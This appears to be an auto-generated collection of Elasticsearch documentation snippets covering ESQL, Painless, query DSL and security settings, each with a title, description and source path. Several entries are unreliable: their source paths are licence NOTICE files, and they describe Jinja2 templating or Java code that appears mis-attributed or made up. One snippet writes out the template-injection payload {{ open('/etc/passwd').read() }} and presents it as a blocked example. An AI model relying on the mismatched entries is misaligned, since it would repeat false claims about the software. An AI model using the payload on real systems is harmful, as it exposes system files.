https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.reindex.txt#2025-04-21_snippet_4\n\nLANGUAGE: groovy\nCODE:\n```\nclass org.elasticsearch.script.field.WriteField {\n    String getName()\n    boolean exists()\n    WriteField move(def)\n    WriteField overwrite(def)\n    void remove()\n    WriteField set(def)\n    WriteField append(def)\n    boolean isEmpty()\n    int size()\n    Iterator iterator()\n    def get(def)\n    def get(int, def)\n    boolean hasValue(Predicate)\n    WriteField transform(Function)\n    WriteField deduplicate()\n    WriteField removeValuesIf(Predicate)\n    WriteField removeValue(int)\n    NestedDocument doc()\n    NestedDocument doc(int)\n    Iterable docs()\n}\n```\n\n----------------------------------------\n\nTITLE: Concatenating String Multiple Times with REPEAT in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the REPEAT function in ESQL. It takes a string 'Hello!' and repeats it three times, storing the result in a new column 'triple_a'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/repeat.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"Hello!\"\n| EVAL triple_a = REPEAT(a, 3)\n```\n\n----------------------------------------\n\nTITLE: Rounding Up Numbers Using CEIL Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the CEIL function in ESQL to round a number up to the nearest integer. It creates a row with a decimal value and then applies the CEIL function to round it up.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/ceil.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL a=CEIL(a)\n```\n\n----------------------------------------\n\nTITLE: Multiple Percolate Queries\nDESCRIPTION: Demonstrates how to specify multiple percolate queries in a single search request using named queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"should\": [\n        {\n          \"percolate\": {\n            \"field\": \"query\",\n            \"document\": {\n              \"message\": \"bonsai tree\"\n            },\n            \"name\": \"query1\"\n          }\n        },\n        {\n          \"percolate\": {\n            \"field\": \"query\",\n            \"document\": {\n              \"message\": \"tulip flower\"\n            },\n            \"name\": \"query2\"\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using CEIL Function in ESQL\nDESCRIPTION: This example demonstrates how to use the CEIL function in ESQL to round a decimal value up to the next integer. The query creates a row with a double value of 1.8 and then applies CEIL to round it up to 2.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/ceil.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL a=CEIL(a)\n```\n\n----------------------------------------\n\nTITLE: Accessing Elasticsearch Repository for Snapshot Recovery\nDESCRIPTION: Method that accesses a specific repository by name from the RepositoriesService. It verifies the repository exists and is accessible for snapshot recovery operations, throwing appropriate exceptions if the repository cannot be found.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-azure/licenses/siv-mode-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nprotected Repository repository(String repository) {\n    return repositoriesService.repository(repository);\n}\n```\n\n----------------------------------------\n\nTITLE: Listing Installed Elasticsearch Plugins via Command Line\nDESCRIPTION: Command to list all currently installed Elasticsearch plugins using the elasticsearch-plugin utility. This provides a simple way to view which plugins are active in the current installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/listing-removing-updating.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nsudo bin/elasticsearch-plugin list\n```\n\n----------------------------------------\n\nTITLE: S3 Metric Example\nDESCRIPTION: This snippet presents an example where a specific metric for s3 storage classes is created. It illustrates the usage of prefixed metric names when similar metrics have significantly different implementations/related metrics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_1\n\nLANGUAGE: none\nCODE:\n```\n\"es.repositories.s3.deep_archive_access.total\"\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP Client Certificate Authentication in Elasticsearch\nDESCRIPTION: YAML configuration for TLS client certificate authentication in Elasticsearch. This setup requires clients to provide valid certificates and uses the PKI realm for authentication.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.ssl.enabled: true\nxpack.security.http.ssl.client_authentication: required\nxpack.security.http.authentication.type: pki\nxpack.security.http.authentication.realm: pki1\n```\n\n----------------------------------------\n\nTITLE: Implementing Bulk Request Class for Elasticsearch\nDESCRIPTION: Definition of the BulkRequest class that extends ActionRequest and implements CompositeIndicesRequest and ToXContentObject. This class manages multiple operations to be executed in a single request to improve performance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-http-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic class BulkRequest extends ActionRequest implements CompositeIndicesRequest, ToXContentObject {\n```\n\n----------------------------------------\n\nTITLE: Importing Python Modules in Jinja2 Templates for Elasticsearch\nDESCRIPTION: Shows how to import Python standard library modules for use in Jinja2 templates. This example imports the 'os' module to access operating system related functionality within templates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/tools/ansi-console/licenses/jansi-NOTICE.txt#2025-04-21_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nimport os\n```\n\n----------------------------------------\n\nTITLE: IP Range Aggregation with Keyed Response\nDESCRIPTION: Demonstrates how to get a keyed response format for IP range aggregations by setting the 'keyed' parameter to true.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-iprange-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /ip_addresses/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"ip_ranges\": {\n      \"ip_range\": {\n        \"field\": \"ip\",\n        \"ranges\": [\n          { \"to\": \"10.0.0.5\" },\n          { \"from\": \"10.0.0.5\" }\n        ],\n        \"keyed\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a pipeline with selected attachment properties\nDESCRIPTION: Example showing how to create an attachment processor pipeline that extracts only specific properties (content and title) from attachments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/attachment\n{\n  \"description\" : \"Extract attachment information\",\n  \"processors\" : [\n    {\n      \"attachment\" : {\n        \"field\" : \"data\",\n        \"properties\": [ \"content\", \"title\" ],\n        \"remove_binary\": true\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Right Shift with the Def Type in Painless\nDESCRIPTION: This example illustrates using the right shift operator with the def type in Painless. It highlights implicit casting behavior and the expected results after the operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_27\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 16 >> 2; <1>\ndef y = x >> 1;  <2>\n```\n\n----------------------------------------\n\nTITLE: Including IP_PREFIX Function Documentation Sections in Markdown\nDESCRIPTION: This snippet shows the structure of the documentation file, including various sections related to the IP_PREFIX function using Markdown include directives.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/ip_prefix.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n## `IP_PREFIX` [esql-ip_prefix]\n\n**Syntax**\n\n:::{image} ../../../images/functions/ip_prefix.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/ip_prefix.md\n:::\n\n:::{include} ../description/ip_prefix.md\n:::\n\n:::{include} ../types/ip_prefix.md\n:::\n\n:::{include} ../examples/ip_prefix.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with UAX URL Email Tokenizer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the UAX URL email tokenizer to analyze a sample text containing an email address. It shows how the tokenizer keeps the email address as a single token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-uaxurlemail-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"uax_url_email\",\n  \"text\": \"Email me at john.smith@global-international.com\"\n}\n```\n\n----------------------------------------\n\nTITLE: Invalid Jinja2 Template with Disallowed File I/O Operations\nDESCRIPTION: Example of a prohibited template pattern attempting to perform file I/O operations. This snippet is shown as an invalid usage that would be blocked by Elasticsearch's security mechanisms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/tools/ansi-console/licenses/jansi-NOTICE.txt#2025-04-21_snippet_7\n\nLANGUAGE: text\nCODE:\n```\n{{ open('/etc/passwd').read() }}\n```\n\n----------------------------------------\n\nTITLE: Checking Task Cancellation in Java\nDESCRIPTION: This snippet demonstrates how tasks should periodically check for cancellation and throw a TaskCancelledException if cancelled. It's a common pattern for implementing cancellable tasks in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/internal/DistributedArchitectureGuide.md#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nif (cancellableTask.isCancelled()) {\n    throw new TaskCancelledException(\"Task cancelled\");\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a CancellableCollector with explicit context checking\nDESCRIPTION: This snippet demonstrates how to create a CancellableCollector that periodically checks a TaskCancellationContext to determine if the collection operation should be cancelled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/vector-tile/licenses/slf4j-nop-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nCancellableCollector<SomeType> cancellableCollector = CancellableCollector.newCollector(\n    Collectors.toList(),  // The underlying collector\n    taskCancellationContext::checkForCancel  // Function that throws if cancelled\n);\n```\n\n----------------------------------------\n\nTITLE: Including Specific Token Types in Elasticsearch Analysis\nDESCRIPTION: Example of using the keep_types filter to retain only numeric tokens (<NUM>) from input text using the analyze API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keep-types-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [\n    {\n      \"type\": \"keep_types\",\n      \"types\": [ \"<NUM>\" ]\n    }\n  ],\n  \"text\": \"1 quick fox 2 lazy dogs\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using ROUND Function with STATS in ESQL\nDESCRIPTION: Demonstrates how to calculate an average salary and round it using ESQL. The query first computes the average salary from an employees table, then rounds the result using the ROUND function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/stats.csv-spec/statsUnnamedColumnEval.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS AVG(salary)\n| EVAL avg_salary_rounded = ROUND(`AVG(salary)`)\n```\n\n----------------------------------------\n\nTITLE: Basic HTTP Entity Usage Restrictions\nDESCRIPTION: Identifies problematic HTTP entity classes that make it easy to forget setting content type. This includes BasicHttpEntity, EntityTemplate, and SerializableEntity.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/http-signatures.txt#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\norg.apache.http.entity.BasicHttpEntity#<init>()\n\norg.apache.http.entity.EntityTemplate#<init>(org.apache.http.entity.ContentProducer)\n\norg.apache.http.entity.SerializableEntity#<init>(java.io.Serializable)\n```\n\n----------------------------------------\n\nTITLE: Example of ROUND Function with Positive Precision\nDESCRIPTION: Shows rounding a negative decimal number to 1 decimal place, demonstrating that it rounds to the nearest value according to standard rounding rules.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_26\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ROUND(-345.153, 1) AS rounded;\n\n    rounded\n---------------\n-345.2\n```\n\n----------------------------------------\n\nTITLE: Geo Distance Query in Elasticsearch\nDESCRIPTION: Query to find documents with geoshapes or geopoints within a specified distance from a central point. Useful for proximity-based searches and location-aware applications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/geo-queries.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"query\": {\n    \"geo_distance\": {\n      \"distance\": \"10km\",\n      \"location\": {\n        \"lat\": 40.715,\n        \"lon\": -74.011\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Post-Decrement Operator in Painless\nDESCRIPTION: This snippet demonstrates the usage of the post-decrement operator '--' with various numeric types in Painless, including its behavior with type promotion and implicit casting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\nshort i = 0;\ni--;\nlong j = 1;\nlong k;\nk = j--;\n```\n\n----------------------------------------\n\nTITLE: Example Metric Naming\nDESCRIPTION: This snippet shows examples of how to properly name metrics in Elasticsearch according to the guidelines, emphasizing placing common elements at the beginning of the hierarchy for easier addition of new metrics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_0\n\nLANGUAGE: none\nCODE:\n```\n\"es.indices.docs.deleted.total\"\n```\n\n----------------------------------------\n\nTITLE: Response showing document with character limit applied\nDESCRIPTION: Response showing the extracted properties with a limit of 11 characters for the content field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_9\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"found\": true,\n  \"_index\": \"my-index-000001\",\n  \"_id\": \"my_id\",\n  \"_version\": 1,\n  \"_seq_no\": 35,\n  \"_primary_term\": 1,\n  \"_source\": {\n    \"attachment\": {\n      \"content_type\": \"application/rtf\",\n      \"language\": \"is\",\n      \"content\": \"Lorem ipsum\",\n      \"content_length\": 11\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Keystore Type for Remote Cluster Server SSL in Elasticsearch\nDESCRIPTION: Setting to specify the format of the keystore file for remote cluster server SSL. Must be either 'jks' or 'PKCS12', with automatic detection based on file extension.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_37\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_server.ssl.keystore.type\n```\n\n----------------------------------------\n\nTITLE: Basic Jinja2 Template Expression Syntax in Elasticsearch\nDESCRIPTION: Shows the basic syntax for including expressions in Jinja2 templates for Elasticsearch. The example demonstrates how to use double curly braces to embed variables and expressions in configuration files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/tools/ansi-console/licenses/jansi-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n{{ expression }}\n```\n\n----------------------------------------\n\nTITLE: Boxplot Aggregation with High Accuracy Execution Hint in Elasticsearch\nDESCRIPTION: This snippet shows how to use the execution_hint parameter to optimize the boxplot aggregation for accuracy at the expense of performance in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-boxplot-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_boxplot\": {\n      \"boxplot\": {\n        \"field\": \"load_time\",\n        \"execution_hint\": \"high_accuracy\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Identifier Grammar in Painless\nDESCRIPTION: Specifies the grammar rule for valid identifiers in Painless. Identifiers must start with a letter or underscore, followed by any number of letters, numbers, or underscores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-identifiers.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nID: [_a-zA-Z] [_a-zA-Z-0-9]*;\n```\n\n----------------------------------------\n\nTITLE: Example of POWER Function with Negative Exponents\nDESCRIPTION: Shows how the POWER function handles negative exponents, calculating 5⁻¹ (1/5) and 5⁻² (1/25).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_22\n\nLANGUAGE: sql\nCODE:\n```\nSELECT POWER(5, -1), POWER(5, -2);\n\n  POWER(5, -1) |  POWER(5, -2)\n---------------+---------------\n0.2            |0.04\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Join Field Mapping\nDESCRIPTION: Sets up an Elasticsearch index with a join field mapping to establish parent-child document relationships. Defines a relationship between 'my-parent' and 'my-child' document types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-parent-id-query.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my-join-field\": {\n        \"type\": \"join\",\n        \"relations\": {\n          \"my-parent\": \"my-child\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Integer Literal Grammar Specification\nDESCRIPTION: Defines the grammar rules for integer literals in Painless, including decimal, octal, and hexadecimal notations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-literals.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nINTEGER: '-'? ( '0' | [1-9] [0-9]* ) [lLfFdD]?;\nOCTAL:   '-'? '0' [0-7]+ [lL]?;\nHEX:     '-'? '0' [xX] [0-9a-fA-F]+ [lL]?;\n```\n\n----------------------------------------\n\nTITLE: Disabling _source Field in Elasticsearch Index Mapping\nDESCRIPTION: This snippet demonstrates how to disable the _source field when creating an Elasticsearch index. Disabling _source can reduce storage overhead but limits certain functionalities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-source-field.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"_source\": {\n      \"enabled\": false\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining buckets_path Syntax in EBNF\nDESCRIPTION: Extended Backus-Naur form definition of the buckets_path syntax used in pipeline aggregations to reference other aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/pipeline.md#2025-04-21_snippet_0\n\nLANGUAGE: ebnf\nCODE:\n```\nAGG_SEPARATOR       =  `>` ;\nMETRIC_SEPARATOR    =  `.` ;\nAGG_NAME            =  <the name of the aggregation> ;\nMETRIC              =  <the name of the metric (in case of multi-value metrics aggregation)> ;\nMULTIBUCKET_KEY     =  `[<KEY_NAME>]`\nPATH                =  <AGG_NAME><MULTIBUCKET_KEY>? (<AGG_SEPARATOR>, <AGG_NAME> )* ( <METRIC_SEPARATOR>, <METRIC> ) ;\n```\n\n----------------------------------------\n\nTITLE: RDS Database Metrics Configuration\nDESCRIPTION: Comprehensive set of Amazon RDS database metrics including CPU usage, storage metrics, latency measurements, throughput statistics, and replication metrics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/test/framework/src/main/resources/org/elasticsearch/common/xcontent/support/many_filters.txt#2025-04-22_snippet_3\n\nLANGUAGE: plaintext\nCODE:\n```\naws.rds.aurora_bin_log_replica_lag\naws.rds.aurora_global_db.data_transfer.bytes\naws.rds.cpu.credit_balance\naws.rds.database_connections\naws.rds.latency.commit\n```\n\n----------------------------------------\n\nTITLE: Indexing a Document with a Pipeline in Elasticsearch\nDESCRIPTION: Indexes a document into 'my-index-000001' while specifying 'pipelineB' to process the document. This will execute both the outer and inner pipelines in sequence.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/pipeline-processor.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/_doc/1?pipeline=pipelineB\n{\n  \"field\": \"value\"\n}\n```\n\n----------------------------------------\n\nTITLE: Date Function Transformations in Elasticsearch SQL\nDESCRIPTION: Examples of date-related SQL functions (DATE_TRUNC, DATE_PART, DATETIME_FORMAT) and their translations into Elasticsearch internal scripts. Shows parameter handling and date formatting patterns.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSELECT int FROM test WHERE DATE_TRUNC('month', date) > '2018-09-04'::date;\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\nInternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.gt(InternalSqlScriptUtils.dateTrunc(params.v0,InternalQlScriptUtils.docValue(doc,params.v1),params.v2),InternalSqlScriptUtils.asDateTime(params.v3)))\n```\n\n----------------------------------------\n\nTITLE: Creating New PKCS#12 CA Certificate\nDESCRIPTION: Function to generate a new PKCS#12 Certificate Authority with specified parameters including file path, password, and distinguished name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/ssl/SSLErrorMessageTests/README.txt#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nfunction new-p12-ca() {\n    local P12File=\"$1\"\n    local P12Pass=\"$2\"\n    local CaDn=\"$3\"\n\n    certutil ca --ca-dn=\"$CaDn\" --days=5000 --out ${PWD}/$P12File --pass=\"$P12Pass\"\n}\n```\n\n----------------------------------------\n\nTITLE: API Key Hashing Algorithms Configuration\nDESCRIPTION: Settings for xpack.security.authc.api_key.hashing.algorithm that specify how API key credentials are hashed when stored. Supports secure salted SHA-256 and BCrypt options.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_53\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.authc.api_key.hashing.algorithm: ssha256|bcrypt\n```\n\n----------------------------------------\n\nTITLE: Using SPLIT Function in ESQL to Convert Delimited String to Array\nDESCRIPTION: This example demonstrates using the SPLIT function to convert a semicolon-delimited string into an array. The function takes two parameters: the input string and the delimiter character.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/split.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW words=\"foo;bar;baz;qux;quux;corge\"\n| EVAL word = SPLIT(words, \";\")\n```\n\n----------------------------------------\n\nTITLE: Basic Remote Recovery Settings in Elasticsearch\nDESCRIPTION: Controls the maximum bandwidth for remote recovery operations. This setting limits total inbound and outbound remote recovery traffic on each node. Default value is 40mb.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/cross-cluster-replication-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: properties\nCODE:\n```\nccr.indices.recovery.max_bytes_per_sec=40mb\n```\n\n----------------------------------------\n\nTITLE: ESQL Change Point Detection Example\nDESCRIPTION: Example showing how to detect step changes in a dataset using the CHANGE_POINT command\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/README.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW key=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25]\n| MV_EXPAND key\n| EVAL value = CASE(key<13, 0, 42)\n| CHANGE_POINT value ON key\n| WHERE type IS NOT NULL\n```\n\n----------------------------------------\n\nTITLE: Checking if license status is active in Elasticsearch using Java\nDESCRIPTION: This utility function checks if a license status response indicates that the license is active. It examines the status property of a response and returns true if the status is 'active'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/gson-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\npublic static boolean isActive(Map<String, Object> response) {\n    if (response == null) {\n        return false;\n    }\n    return \"active\".equals(response.get(\"status\"));\n}\n```\n\n----------------------------------------\n\nTITLE: IP Range Aggregation with Custom Keys\nDESCRIPTION: Shows how to assign custom keys to IP ranges in the aggregation results using the 'key' parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-iprange-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /ip_addresses/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"ip_ranges\": {\n      \"ip_range\": {\n        \"field\": \"ip\",\n        \"ranges\": [\n          { \"key\": \"infinity\", \"to\": \"10.0.0.5\" },\n          { \"key\": \"and-beyond\", \"from\": \"10.0.0.5\" }\n        ],\n        \"keyed\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining IntStream.Builder Interface in Painless - Java\nDESCRIPTION: Defines the IntStream.Builder class, used to create int streams incrementally. Elements can be added one at a time before constructing the final IntStream.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.stream.txt#2025-04-21_snippet_5\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.stream.IntStream$Builder {\n  IntStream.Builder add(int)\n  IntStream build()\n}\n```\n\n----------------------------------------\n\nTITLE: New Array Creation in Painless\nDESCRIPTION: Shows how to create new arrays using the new array operator 'new []'. Includes examples of single and multi-dimensional array creation with dynamic sizing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-array.md#2025-04-21_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\nint[] x = new int[5];\nx = new int[10];\nint y = 2;\ndef z = new def[y][y*2];\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Documentation\nDESCRIPTION: Parameter documentation for an ESQL function that processes angles in radians. The function accepts a single parameter 'angle' which can be null, in which case the function returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/tan.md#2025-04-21_snippet_0\n\nLANGUAGE: asciidoc\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`angle`\n:   An angle, in radians. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Verifying Docker buildx platform support\nDESCRIPTION: Shows how to list supported build platforms with Docker buildx. This example demonstrates output when ARM64 support is missing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/docker/README.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ docker buildx ls\nNAME/NODE DRIVER/ENDPOINT STATUS  BUILDKIT PLATFORMS\ndefault * docker\n  default default         running 20.10.21 linux/amd64, linux/386\n```\n\n----------------------------------------\n\nTITLE: Updating Plugin File with Option 1 Method (cURL)\nDESCRIPTION: This snippet demonstrates how to update the file associated with an existing plugin extension using the Option 1 method. It includes specifying the download URL, extension type, name, and version.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_15\n\nLANGUAGE: sh\nCODE:\n```\ncurl -X POST \\\n  https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID \\\n  -H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n   \"download_url\" : \"https://my_site/custom-plugin-8.4.3-10212022.zip\",\n   \"extension_type\" : \"plugin\",\n    \"name\": \"custom-plugin-10212022\",\n   \"version\" : \"8.4.3\"\n}'\n```\n\n----------------------------------------\n\nTITLE: Using Alias for GCE Service Account Scopes with knife google\nDESCRIPTION: Shows how to use the shorthand alias for specifying compute read-write scope when creating GCE instances with knife google.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-tips.md#2025-04-21_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\n    --gce-service-account-scopes compute-rw\n```\n\n----------------------------------------\n\nTITLE: NULLIF Function\nDESCRIPTION: Returns null if two expressions are equal, otherwise returns the first expression.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-conditional.md#2025-04-21_snippet_8\n\nLANGUAGE: sql\nCODE:\n```\nNULLIF(\n    expression,\n    expression)\n```\n\n----------------------------------------\n\nTITLE: Converting Integer to String with CAST\nDESCRIPTION: Example of using CAST to convert an integer to a VARCHAR (string) type in Elasticsearch SQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-type-conversion.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CAST(123 AS VARCHAR) AS string;\n\n    string\n---------------\n123\n```\n\n----------------------------------------\n\nTITLE: Filtering Books by Author in ESQL\nDESCRIPTION: An ESQL query that searches for books where the author field contains 'Faulkner'. The query uses the FROM clause to specify the books index and the WHERE clause with a text match condition.\nSOURCE: 